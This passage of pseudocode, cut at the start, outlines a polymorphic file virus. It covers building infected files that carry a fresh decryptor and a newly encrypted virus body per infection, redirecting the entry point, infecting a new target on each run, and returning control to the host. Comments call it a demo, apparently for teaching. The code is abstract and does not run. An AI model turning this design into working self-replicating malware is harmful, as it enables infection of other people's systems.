      new_decryptor, // Unique per infection
      encrypted_virus, // Unique per infection (new key)
      new_key,
      original_entry,
      original_host
    ]

    // Update entry point to run decryptor first
    set_entry_point(file, offset_of(new_decryptor))
    write_file(file, infected_content)
    break // Infect 1 new file per run for demo

// --------------------------
// 5. Main Virus Logic (Runs after decryption)
// --------------------------
function VIRUS_MAIN():
  INFECT_NEW_TARGET() // Infect new targets with new mutated variant
  PAYLOAD() // Run harmless demo payload
  jump_to_original_entry() // Return control to original host program
